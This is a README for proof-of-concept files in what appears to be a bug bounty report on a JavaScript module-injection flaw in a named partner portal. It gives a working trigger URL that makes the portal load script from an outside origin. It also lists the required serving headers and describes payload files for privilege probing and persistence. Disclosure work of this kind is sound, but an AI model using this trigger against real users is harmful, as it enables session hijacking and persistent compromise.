PoC files for the partner.thetradedesk.com AFE module-injection report.

Host all files on one origin you control. Both files MUST be served with:
    Content-Type: application/javascript
    Access-Control-Allow-Origin: *

Trigger (while signed in to the Partner Portal):
    https://partner.thetradedesk.com/v3/portal/access-requests?access-requests-version=https://kyuda1-0.github.io/ttd-xss-poc

versionManifest.js      required by the loader before entry.js
entry.js                minimal alert() proof
entry-readonly.js       read-only privilege probe (section 6.4 of the report)
entry-persistence.js    persistence demo (section 5 of the report)

Cleanup after testing the persistence demo:
    document.cookie = "cdnPath=; path=/; max-age=0"
